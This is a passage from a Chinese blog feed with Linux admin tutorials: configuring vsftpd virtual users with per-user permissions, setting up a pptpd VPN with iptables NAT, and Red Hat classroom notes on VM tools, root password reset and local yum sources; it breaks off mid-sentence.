        <content type="html"><![CDATA[<h2 id="一、要求"><a href="#一、要求" class="headerlink" title="一、要求"></a>一、要求</h2><p>现在我们需要在<code>Ubuntu14.04</code>上利用<code>vsftpd</code>创建<code>ftp</code>服务器环境，然后在禁止匿名访问的前提下，创建以下四个虚拟用户并配权：</p><ol><li>一个用户为：<code>tea1</code>，密码为：<code>tea1pass</code>，进入<code>tea1</code>目录（对该目录及其子目录拥有所有权限，不可进入上级目录）。</li><li>一个用户为：<code>tea2</code>，密码为：<code>tea2pass</code>，进入<code>tea2</code>目录（对该目录及其子目录拥有所有权限，不可进入上级目录）。</li><li>一个用户为：<code>stu</code>，密码为：<code>stupass</code>，进入<code>ftp</code>总目录（只拥有上传文件权限，不可进入上级目录）。</li><li>一个用户名为：<code>admin</code>，密码为：<code>admin</code>，进入<code>ftp</code>总目录（拥有ftp的全部权限）。</li></ol><p>注：<code>ftp</code>的主目录为<code>/home/ftp/ftp</code>，如果需要创建其他用户，或者修改用户权限，使用SSH修改。</p><h2 id="二、vsftpd安装："><a href="#二、vsftpd安装：" class="headerlink" title="二、vsftpd安装："></a>二、vsftpd安装：</h2><p>在配置<code>vsftpd</code>之前，我们先安装<code>vsftpd</code>，<code>vsftpd</code>的安装比较简单。我们直接使用<code>apt-get</code>进行安装，如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install vsftpd</span><br></pre></td></tr></table></figure><p>安装步骤很简单，这一个命令就ok了，不过配置才是大头。你可以使用下面的命令尝试去看<code>vsftpd</code>安装的一些文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -L vsftpd |<span class="built_in">tac</span></span><br></pre></td></tr></table></figure><p>（这里只说明<code>/etc/init/vsftpd.conf</code>是<code>vsftpd</code>的初始化文件，而<code>/etc/vsftpd.conf</code>是<code>vsftpd</code>的配置文件）</p><p>vsftpd的启动，停止，重启方式：</p><ol><li><p>在ubuntu下要启动、停止、重启vsftpd，我们必须使用以下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service vsftpd stop</span><br><span class="line">sudo service vsftpd start</span><br><span class="line">sudo service vsftpd restart</span><br></pre></td></tr></table></figure></li><li><p>在centos下，我们可以使用以下命令：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service vsftpd stop</span><br><span class="line">/etc/init.d/vsftpd stop</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h2><p>由于我们已经安装完了，所以，接下来我们就要进行一些配置，其实在我们安装完vsftpd之后，这个程序就会自动创建一个账户为ftp的账户，大家可以用下面的命令查看创建好的ftp用户：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure><p>不过我不想使用它，我们就先把它删除了吧，反正以后也用不到，然后我们再创建一个用户ftp，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">userdel -r ftp </span><br><span class="line">sudo useradd -m -s /bin/bash ftp</span><br></pre></td></tr></table></figure><p>创建后，可以查看一下刚创建的用户（注意：这个用户是无法登录系统的，只是用来作后面虚拟用户的载体）：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd |grep ftp</span><br></pre></td></tr></table></figure><p>创建完成新用户后，我们来创建该用户的对应的目录并修改用户之前的对应目录：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chown</span> -R ftp:ftp /home/ftp/</span><br></pre></td></tr></table></figure><p>由于我们需要使用虚拟用户登录系统，所以我们接下来设置虚拟用户的账户名和密码的文件<code>login.txt</code>，如下代码所示：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/vsftpd/</span><br><span class="line">sudo vim /etc/vsftpd/login.txt</span><br></pre></td></tr></table></figure><p>然后在文件中，输入我们想要创建的四个用户的用户名及其密码并保存,需要注意的是一个账户一行，一个密码一行，一共四个用户和密码，也就是需要占用八行。<br>之后，我们需要用到<code>db_load</code>进行加密处理，所以我们还需要下载并安装<code>db-util</code>，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install db-util</span><br></pre></td></tr></table></figure><p>安装成功后，使用<code>db_load</code>对<code>loginx.txt</code>进行加密处理：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo db_load -T -t <span class="built_in">hash</span> -f /etc/vsftpd/login.txt /etc/vsftpd/login.db</span><br></pre></td></tr></table></figure><p>将<code>loginx.txt</code>加密处理后，我们接下来配置<code>vsftpd</code>的PAM验证。<br>创建验证文件，代码如下：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pam.d/vsftpd.virtual</span><br></pre></td></tr></table></figure><p>在打开的文件中输入下面的代码（注意：下面代码中的<code>pam_userdb.so</code>的路径根据具体的路径进行填写，如果不知道，请find一下。下面的<code>/etc/vsftpd/login</code>等同于<code>/etc/vsftpd/login.db</code>文件，后面不需要写后缀。）： </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auth required /lib/x86_64-linux-gnu/security/pam_userdb.so db=/etc/vsftpd/login</span><br><span class="line">account required /lib/x86_64-linux-gnu/security/pam_userdb.so db=/etc/vsftpd/login</span><br></pre></td></tr></table></figure><p>接下来我们开始进行用户权限的分配！使用下面代码打开配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/vsftpd.conf</span><br></pre></td></tr></table></figure><p>确保该文件中下面的代码正确并且已经启用（如果没有请手动添加）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listen=YES</span><br><span class="line">listen_ipv6=NO</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=YES</span><br><span class="line">write_enable=YES</span><br><span class="line">local_umask=022</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line">use_localtime=YES</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">connect_from_port_20=YES</span><br><span class="line">xferlog_file=/var/log/vsftpd.log</span><br><span class="line">xferlog_std_format=YES</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">chroot_list_enable=NO</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">secure_chroot_dir=/var/run/vsftpd/empty</span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</span><br><span class="line">rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</span><br><span class="line">ssl_enable=NO</span><br><span class="line">guest_enable=YES</span><br><span class="line">pam_service_name=vsftpd.virtual</span><br><span class="line">user_config_dir=/etc/vsftpd/vu</span><br><span class="line">pasv_enable=YES</span><br><span class="line">pasv_min_port=30000</span><br><span class="line">pasv_max_port=31000</span><br></pre></td></tr></table></figure><p>上面这些代码的具体含义请自行查询，这里不做解释。<br>首先由于这些虚拟用户还没有对应的文件夹，所以我们需要在<code>/home/ftp/ftp</code>中创建对应的文件夹，并且将文件夹所有者设置为<code>ftp</code>，由于<code>stu</code>用户和<code>admin</code>用户都指向总目录，所以不需要额外创建目录，因此代码如下所示：  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /home/ftp/ftp</span><br><span class="line">sudo <span class="built_in">chown</span> -R ftp:ftp /home/ftp/ftp/</span><br><span class="line">sudo <span class="built_in">mkdir</span> /home/ftp/ftp/tea1</span><br><span class="line">sudo <span class="built_in">chown</span> -R ftp:ftp /home/ftp/ftp/tea1/</span><br><span class="line">sudo <span class="built_in">mkdir</span> /home/ftp/ftp/tea2</span><br><span class="line">sudo <span class="built_in">chown</span> -R ftp:ftp /home/ftp/ftp/tea2/</span><br></pre></td></tr></table></figure><h2 id="四、虚拟用户的权限的配置"><a href="#四、虚拟用户的权限的配置" class="headerlink" title="四、虚拟用户的权限的配置"></a>四、虚拟用户的权限的配置</h2><p>创建完虚拟用户对应的目录后，我们需要建立虚拟用户对应的配置文件，对虚拟用户的权限进行配置，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/vsftpd/vu</span><br><span class="line">sudo vim /etc/vsftpd/vu/tea1</span><br></pre></td></tr></table></figure><p>在打开的窗口中输入<code>tea1</code>用户的权限设置并保存：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guest_username=ftp</span><br><span class="line">local_root=/home/ftp/ftp/tea1/</span><br><span class="line">virtual_use_local_privs=YES</span><br><span class="line">anon_umask=133</span><br><span class="line">cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER</span><br></pre></td></tr></table></figure><p>然后建立<code>tea2</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/vsftpd/vu/tea2</span><br></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guest_username=ftp</span><br><span class="line">local_root=/home/ftp/ftp/tea2/</span><br><span class="line">virtual_use_local_privs=YES</span><br><span class="line">anon_umask=133</span><br><span class="line">cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER</span><br></pre></td></tr></table></figure><p>建立<code>stu</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/vsftpd/vu/stu</span><br></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guest_username=ftp</span><br><span class="line">local_root=/home/ftp/ftp/</span><br><span class="line">virtual_use_local_privs=YES</span><br><span class="line">anon_umask=133</span><br><span class="line">cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,SIZE,STOR,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST</span><br></pre></td></tr></table></figure><p>建立<code>admin</code>的配置文件并输入配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/vsftpd/vu/admin</span><br></pre></td></tr></table></figure><p>配置信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guest_username=ftp</span><br><span class="line">local_root=/home/ftp/ftp/</span><br><span class="line">virtual_use_local_privs=YES</span><br><span class="line">anon_umask=133</span><br><span class="line">cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER</span><br></pre></td></tr></table></figure><blockquote><p>关于<code>cmds_allowed</code>的一些知识</p></blockquote><p>以逗号分隔的方式指定可用的FTP命令(post　login. USER, PASS and QUIT 是始终可用的命令)。在vsftpd中可以使用默认的一些方法配置来调节用户的对文件操作的权限，但是，对于有些权限的配置的效果却不尽人意，为此<code>cmds_allowed</code>就可以发挥它巨大的作用。这是一个强有力的locking down一个FTP服务器的手段。下面是它的实例和一些配置解释：</p><ol><li>只能上传。不能下载、删除、重命名。  <code>cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,SIZE,STOR,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST</code></li><li>只能下载、删除、重命名。不能上传。<br>  <code>cmds_allowed=FEAT,REST,CWD,LIST,MDTM,MKD,NLST,PASS,PASV,PORT,PWD,QUIT,RMD,RNFR,RNTO,RETR,DELE,SIZE,TYPE,USER,ACCT,APPE,CDUP,HELP,MODE,NOOP,REIN,STAT,STOU,STRU,SYST</code></li><li>配置解释：<br>  <code>cmds_allowed=ABOR,ACCT,APPE,CWD,CDUP,DELE,HELP,LIST,MODE,MDTM,MKD,NOOP,NLST,PASS,PASV,PORT,PWD,QUIT,REIN,RETR,RMD,RNFR,RNTO,SITE,SIZE,STOR,STAT,STOU,STRU,SYST,TYPE,USER</code><br>  其中：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CWD - change working directory 更改目录</span><br><span class="line">DELE - delete a remote file 删除文件</span><br><span class="line">LIST - list remote files 列目录</span><br><span class="line">MKD - make a remote directory 新建文件夹</span><br><span class="line">NLST - name list of remote directory</span><br><span class="line">PWD - <span class="built_in">print</span> working directory 显示当前工作目录</span><br><span class="line">RETR - retrieve a remote file 下载文件</span><br><span class="line">RMD - remove a remote directory 删除目录</span><br><span class="line">RNFR - rename from 重命名</span><br><span class="line">RNTO - rename to 重命名</span><br><span class="line">STOR - store a file on the remote host 上传文件</span><br><span class="line">ABOR - abort a file transfer 取消文件传输</span><br><span class="line">CWD - change working directory 更改目录</span><br><span class="line">DELE - delete a remote file 删除文件</span><br><span class="line">LIST - list remote files 列目录</span><br><span class="line">MDTM - <span class="built_in">return</span> the modification time of a file 返回文件的更新时间</span><br><span class="line">MKD - make a remote directory 新建文件夹</span><br><span class="line">NLST - name list of remote directory</span><br><span class="line">PASS - send password</span><br><span class="line">PASV - enter passive mode</span><br><span class="line">PORT - open a data port 打开一个传输端口</span><br><span class="line">PWD - <span class="built_in">print</span> working directory 显示当前工作目录</span><br><span class="line">QUIT - terminate the connection 退出</span><br><span class="line">RETR - retrieve a remote file 下载文件</span><br><span class="line">RMD - remove a remote directory</span><br><span class="line">RNFR - rename from</span><br><span class="line">RNTO - rename to</span><br><span class="line">SITE - site-specific commands</span><br><span class="line">SIZE - <span class="built_in">return</span> the size of a file 返回文件大小</span><br><span class="line">STOR - store a file on the remote host 上传文件</span><br><span class="line">TYPE - <span class="built_in">set</span> transfer <span class="built_in">type</span></span><br><span class="line">USER - send username</span><br><span class="line">ACCT* - send account information</span><br><span class="line">APPE - append to a remote file</span><br><span class="line">CDUP - CWD to the parent of the current directory</span><br><span class="line">HELP - <span class="built_in">return</span> <span class="built_in">help</span> on using the server</span><br><span class="line">MODE - <span class="built_in">set</span> transfer mode</span><br><span class="line">NOOP - <span class="keyword">do</span> nothing</span><br><span class="line">REIN* - reinitialize the connection</span><br><span class="line">STAT - <span class="built_in">return</span> server status</span><br><span class="line">STOU - store a file uniquely</span><br><span class="line">STRU - <span class="built_in">set</span> file transfer structure</span><br><span class="line">SYST - <span class="built_in">return</span> system <span class="built_in">type</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="五、两个问题说明："><a href="#五、两个问题说明：" class="headerlink" title="五、两个问题说明："></a>五、两个问题说明：</h2><blockquote><p>###问题一：vsftpd搭建的FTP服务器存在的中文编码问题</p></blockquote><p>事先说明清楚的是，我的服务器环境是Ubuntu14.04，而FTP的访问者们大多都是使用Windows的系统，并且他们没有多少人使用一些比较专业的FTP客户端软件进行访问，他们大多数都是使用的Windows自带的资源管理器进行访问。</p><p>Linux中使用UTF-8作为locale已经成为理所当然的事，然而windows资源管理器却只支持GBK这一系列的编码，恰巧vsftpd并不会处理文件名的编码，这就会出现很不友好的问题，因此针对vsftpd的这个缺陷，网上之前也有过针对它的补丁，使得vsftpd可以进行编码转换，然而这个补丁的版本较老，针对新版本的vsftpd可能还会出现一系列的错误，这里就不对补丁进行介绍了。</p><p>之后通过一番查询，发现可以使用基于文件系统的fuse-convmvfs创建一个目录的镜像，一不用打补丁，二是所有的ftp服务器都可以使用，它的原理是：fuse-convmvfs 可以创建一个目录的镜像，在这个镜像里面的文件名都是经过 iconv 进行编码转换的结果，在底层则完全是同一个目录。例如下面代码所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convmvfs /home/ftp/ftpgbk -o srcdir=/home/ftp/ftp,icharset=utf8,ocharset=gbk,allow_other,uid=0,gid=11</span><br></pre></td></tr></table></figure><p>上面代码的含义是将 <code>/home/ftp/ftpgbk</code> 作为 <code>/home/ftp/ftp</code> 的一个镜像，只是在 <code>/home/ftp/ftpgbk</code> 里面这些文件的名字“看起来是 GBK 编码的”。执行完上面语句之后，为使客户端使用时，查看的文件不会出现乱码，我们还需要将系统ftp的目录改为我们映射的<code>/home/ftp/ftpgbk</code>，然后还需要把ftp中的各个虚拟用户中的指定的路径中的<code>/home/ftp/ftp</code>改为<code>/home/ftp/ftpgbk</code>，这样就ok了。</p><blockquote><p>###问题二：基于问题一成功后的仍旧的编码问题。</p></blockquote><p>说起来很有意思，大家如果全部读完了上文，应该会知道如果我们没有在tea1，tea2以及admin的目录权限配置文件中书写<code>cmds_allowed</code>,它们还是会对该目录及目录下的所有文件拥有全部权限，但是，如果，你没在它们的配置文件中加上<code>cmds_allowed</code>配置项的话，即使你完成了问题一的解决方式，仍然会出现编码问题，因为我之前写的博客中没有在它们三个的配置文件中加上<code>cmds_allowed</code>配置项，之后调试的时候烦恼了我很长时间，特此记录。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> vsftpd </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pptpd搭建VPN服务器</title>
      <link href="/2016/01/01/pptpd-vpn/"/>
      <url>/2016/01/01/pptpd-vpn/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正题"><a href="#一、正题" class="headerlink" title="一、正题"></a>一、正题</h2><ol><li><p>安装pptpd<br>  安装之前，先更新一下源，<code>sudo apt-get update</code><br>  然后安装：<code>sudo apt-get install pptpd</code></p></li><li><p>配置内网ip策略<br>  <code>sudo vim /etc/pptpd.conf</code><br>  在文件中加入下面2行代码（其实文件末尾有这段代码，不过前面有注释，你也可以直接去掉注释）：<br>  <code>localip 192.168.0.1   remoteip 192.168.0.234-238,192.168.0.245</code></p><blockquote><p>注意：<br>localip 自己服务器的IP（pptpd中设置的，并不是你的服务器真正的ip，此处可以理解为使用路由器时，路由器的管理ip，remoteip 分配给客户端的IP ，所有使用该vpn服务器都会获得该ip段内的一个IP）</p></blockquote></li><li><p>配置dns<br>  <code>sudo vim /etc/ppp/pptpd-options</code><br>  在该文中加入下面2行，也可以配置其他dns:<br>  <code>ms-dns 8.8.8.8   ms-dns 8.8.4.4</code></p></li><li><p>配置VPN帐号<br>  <code>sudo vim /etc/ppp/chap-secrets</code><br>  添加vpn账号、服务器名、vpn密码和IP限制，一个帐号一行，每个参数中间用空格间隔。如：  <code>test * testpass *</code></p></li><li><p>TCP&#x2F;IP策略配置:<br>  <code>sudo vim /etc/sysctl.conf</code><br>  插入下面这一行代码（下面该段代码这个文件中也有，也可以取消注释，我这里是取消注释）,保存并退出：<br>  <code>net.ipv4.ip_forward=1</code><br>  然后使用下面这段代码，可以看到出现的代码中出现刚才添加的或者取消注释的那段代码：<br>  <code>sudo sysctl -p</code>  </p><blockquote><p>注意：一定要注意“-”号的使用，一定要注意，下面也有很多，遇到在提。如果提示<code>net.ipv4.ip_forward = 1</code>，说明配置生效，如下图所示：</p></blockquote></li><li><p>开放网络端口<br>  安装iptables(已安装请忽略，不知道安没安装，那就再安一遍，如果按了会提示)<br>  <code>sudo apt-get install iptables</code><br>  然后开放1723端口：<br>  <code>sudo iptables -I INPUT -p tcp --dport 1723 -j ACCEPT</code></p></li><li><p>配置NAT网络地址转换:<br>  下面的更有意思，记住哈，所有的“-”号都有两个，但是interface前面的“-号”只有一个，还有就是下面代码中的eth0是你的网卡名称，如果不知道你的网卡名称是什么，请使用ifconfig命令查看一下你的网卡名称，一定要注意，如果你的ubuntu有多个网卡的话，一定要查看对应网卡的对应ip，我这里因为有两个网卡，一个拥有内网的ip，一个拥有外网的ip，当然了，我肯定要使用外网的，因此，我使用的是eth1，截图如下（一定要注意结合实际！！）<br>  <code>sudo iptables --table nat --append POSTROUTING --out-interface eth1 --jump MASQUERADE</code></p></li><li><p>为确保系统重启后VPN可直接使用我们需要进行如下操作：</p><blockquote><p>###1.让之前配置的iptables信息保存并设置为开机启动：</p></blockquote></li></ol><ul><li>创建存储iptables信息的文件：<br> <code>touch /etc/iptables</code></li><li>将上面的关于iptables的两个操作信息保存到该文件中：<br> <code>iptables-save &gt; /etc/iptables</code>  </li><li>创建自启动配置文件，并授予可执行权限：<br> <code>touch /etc/network/if-pre-up.d/iptables</code><br> <code>chmod +x /etc/network/if-pre-up.d/iptables</code></li><li>编辑自启动配置文件，内容为启动网络时恢复的iptables配置信息：<br> <code>vi /etc/network/if-pre-up.d/iptables</code><br> 文件中内容为：<br> <code>#!/bin/sh</code><br> <code>/sbin/iptables-restore &lt; /etc/iptables</code>  </li><li>保存该信息后即可，下面是iptables的两个命令解析：<ul><li>保存iptables信息命令： iptables-save&gt;&#x2F;etc&#x2F;iptables  </li><li>恢复iptables信息命令： iptables-restore &lt;&#x2F;etc&#x2F;iptables</li></ul></li></ul><blockquote><p>###2.开机后自动开启pptpd服务：</p></blockquote><ul><li>在&#x2F;etc&#x2F;rc.local文件的exit 0之前添加软件启动命令:<br> <code>/etc/init.d/pptpd start</code></li></ul><ol start="9"><li>最后重启pptpd<br>  <code>sudo /etc/init.d/pptpd restart</code><br>  接下来就可以使用测试的用户名与密码连接你的vpn服务器了。即使系统重启后，我们任然可以直接使用VPN.</li></ol><blockquote><p>###一个问题：连接后部分网站无法访问解决方法</p></blockquote><p>在我们的使用过程中发现百度的相关网站无法访问，当时也并未找到一些方法去解决，昨日，烫烫烫发来消息说原来是虚拟网卡的MTU值影响了部分网站的访问，在他修改后确实成功访问百度，所以贴出解决方案，避免更多人苦恼（我们是将虚拟网卡<code>ppp0</code>的<code>MTU</code>改为<code>1400</code>）。</p><ul><li>临时修改方法：<br> <code>ifconfig ppp0 mtu 1400</code>  </li><li>(推荐)永久修改方法:<br> 避免以后重启机器需重新配置，打开<code>/etc/ppp/ip-up</code>文件，并在<code>exit 0</code>前面（如果没有<code>exit 0</code>的话，就定位到文件末尾）加上如下代码：<br> <code>/sbin/ifconfig $1 mtu 1400</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> pptpd </tag>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Hat课堂学习知识点笔记</title>
      <link href="/2016/01/01/redhat-note/"/>
      <url>/2016/01/01/redhat-note/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境及目录"><a href="#一、环境及目录" class="headerlink" title="一、环境及目录"></a>一、环境及目录</h2><p>课堂讲述及联想所记，便于自己后来查阅同时与他人便利。</p><ul><li>两款虚拟机：VMware Workstation 12 Pro、VirtualBox 5.1.22</li><li>Rad Hat镜像：RedHat-Server-6.4-i386</li><li>其他一些工具：XShell 5、Putty</li></ul><h2 id="二、目录列表"><a href="#二、目录列表" class="headerlink" title="二、目录列表"></a>二、目录列表</h2><blockquote><h2 id="1-VMware的VMware-Tools安装与VirtualBox的增强工具"><a href="#1-VMware的VMware-Tools安装与VirtualBox的增强工具" class="headerlink" title="1.VMware的VMware Tools安装与VirtualBox的增强工具"></a><a href="#redhat_1">1.VMware的VMware Tools安装与VirtualBox的增强工具</a></h2><h2 id="2-RedHat的root用户的密码初始化"><a href="#2-RedHat的root用户的密码初始化" class="headerlink" title="2.RedHat的root用户的密码初始化"></a><a href="#redhat_2">2.RedHat的root用户的密码初始化</a></h2><h2 id="3-RedHat无法使用yum安装软件解决方法"><a href="#3-RedHat无法使用yum安装软件解决方法" class="headerlink" title="3.RedHat无法使用yum安装软件解决方法"></a><a href="#redhat_3">3.RedHat无法使用yum安装软件解决方法</a></h2><h2 id="4-添加KDE桌面-x2F-中文支持和VNC设置体验"><a href="#4-添加KDE桌面-x2F-中文支持和VNC设置体验" class="headerlink" title="4.添加KDE桌面&#x2F;中文支持和VNC设置体验"></a><a href="#redhat_4">4.添加KDE桌面&#x2F;中文支持和VNC设置体验</a></h2><h2 id="5-XShell和X11转发"><a href="#5-XShell和X11转发" class="headerlink" title="5. XShell和X11转发"></a><a href="#redhat_5">5. XShell和X11转发</a></h2></blockquote><p><a id="redhat_1"></a></p><h3 id="2-1、VMware的VMware-Tools安装与VirtualBox的增强工具"><a href="#2-1、VMware的VMware-Tools安装与VirtualBox的增强工具" class="headerlink" title="2.1、VMware的VMware Tools安装与VirtualBox的增强工具"></a>2.1、VMware的VMware Tools安装与VirtualBox的增强工具</h3><p>为了加强同时使用虚拟机与主机的用户体验，像是实现虚拟机和主机图形用户界面之间平滑移动鼠标光标等的需求，我们在两款虚拟机软件中安装对应的增强工具。</p><h3 id="2-2、安装VMware的VMware-Tools："><a href="#2-2、安装VMware的VMware-Tools：" class="headerlink" title="2.2、安装VMware的VMware Tools："></a>2.2、安装VMware的VMware Tools：</h3><ul><li>在虚拟机中进入桌面后，点击VMware菜单栏的”虚拟机”，然后点击”安装VMware Tools”，在RedHat中确定VMware Tools的挂载点位置。</li><li>将VMware Tools中的类似于”VMwareTools-xxxxxx.tar.gz”的文件解压到另一个文件夹(例如tmp)中，解压，并运行安装，一路确定加回车即可。示例代码如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf VMwareTools-xxxxxx.tar.gz -C /tmp/</span><br><span class="line"><span class="built_in">cd</span> vmware-tools-distrib/</span><br><span class="line">./vmware-install.pl</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-3、安装VirtualBox的增强工具："><a href="#2-3、安装VirtualBox的增强工具：" class="headerlink" title="2.3、安装VirtualBox的增强工具："></a>2.3、安装VirtualBox的增强工具：</h3><ul><li>首先确保本机已经安装kernel-devel和gcc两个依赖包，如果没有可以使用下面代码进行安装(如果下面代码使用后出错，请参考<a href="#redhat_3">RedHat无法使用yum在线安装软件解决方法</a>)：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install kernel-devel</span><br><span class="line">yum install gcc</span><br></pre></td></tr></table></figure></li><li>在虚拟机中进入桌面后，查看该虚拟机的界面右下角，会有一排小图标，其中有个光驱图标，确保它是灰色的，即确保该虚拟机的光驱没有被其他占用，然后点击VirtualBox窗口的”设备”，然后点击”安装增强工具”。</li><li>虚拟机系统界面就会弹出安装提示，点击”OK”，然后点击”RUN”继续即可,最后重启生效。类似图如下：<br><img src="https://cdn.bugwz.com/006qpCDTly1ffxq4t0txlj30sa0nawyk.jpg" alt="RedHat"><br><img src="https://cdn.bugwz.com/006qpCDTly1ffxq4thuugj30s30n17p5.jpg" alt="RedHat"></li></ul><p><a id="redhat_2"></a></p><h3 id="2-4、RedHat的root用户的密码初始化"><a href="#2-4、RedHat的root用户的密码初始化" class="headerlink" title="2.4、RedHat的root用户的密码初始化"></a>2.4、RedHat的root用户的密码初始化</h3><p>由于在VMware中安装的RedHat并没有提示设置root用户密码，并且系统策略也不和Ubuntu一样：Ubuntu中当root用户未设置密码时，普通用户可以使用 <code>sudo passwd root</code> 初始化root账户密码。所以我们需要如下步骤设置root账户密码：</p><ul><li>重启系统后在引导装载程序菜单上，用上下方向键选择你忘记密码的那个系统键入”e”来进入编辑模式，我的系统是两个选项，不过都是一个系统，区别在于是否有GUI显示；</li><li>接着用上下键选择最新的内核,这里是”kernel &#x2F;vmlinuz-2.6.32-696.1.1.e16.i686 ro root&#x3D;UUID&#x3D;96504b88-d13d-4a”，然后继续按“e”键；</li><li>然后输入空格+single，即” single”，或者直接输入数字”1”,最后回车；</li><li>然后返回了那个内核界面，按下”b”进入单用户模式，在这里修改root的密码，之后重启即可。</li></ul><p><a id="redhat_3"></a></p><h3 id="2-5、RedHat无法使用yum安装软件解决方法"><a href="#2-5、RedHat无法使用yum安装软件解决方法" class="headerlink" title="2.5、RedHat无法使用yum安装软件解决方法"></a>2.5、RedHat无法使用yum安装软件解决方法</h3><p>如果我们在虚拟机中使用RedHat去执行 <code>yum install xxx</code> 安装软件的话，系统会给出类似于 “This system is not registered to Red Hat Subscription Management.You can use subscription-manager to register.” 这说明我们是没办法使用yum在线安装RedHat的软件了，这就十分尴尬了。这么好用的yum不能用，尴尬癌都犯了有没有。</p><p>三种办法解决，第一种去用CentOS，第二种我们使用RedHat的光盘ISO镜像作为本地源，第三种我们卸载RedHat自带yum，然后用CentOS的yum进行替换。第二种以及第三种的实现方法具体如下所示：</p><h3 id="2-6、使用RedHat的光盘ISO镜像作为本地源"><a href="#2-6、使用RedHat的光盘ISO镜像作为本地源" class="headerlink" title="2.6、使用RedHat的光盘ISO镜像作为本地源"></a>2.6、使用RedHat的光盘ISO镜像作为本地源</h3><ul><li>首先我们需要挂载本地RedHat的光盘ISO镜像，无论是VMware还是VirtualBox，都是在菜单栏目中将可移动设备光盘中设置为对应的RedHat镜像，并挂在到虚拟机中；</li><li>然后我们修改RedHat镜像的挂载位置(一定要记住之前的挂载点)，目的是便于后面使用，防止空格等字符的存在我们无法进入对应目录等，图示及命令如下所示：<br><img src="https://cdn.bugwz.com/006qpCDTly1ffxxatnllej30gw03eaa7.jpg"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">umount /dev/sr0</span><br><span class="line"><span class="built_in">mkdir</span> -p /media/cdrom</span><br><span class="line">mount /dev/sr0 /media/cdrom</span><br></pre></td></tr></table></figure></li><li>接着修改系统源设置文件中的信息，将我们新挂载的RedHat镜像源加入改文件中，这个文件位置是 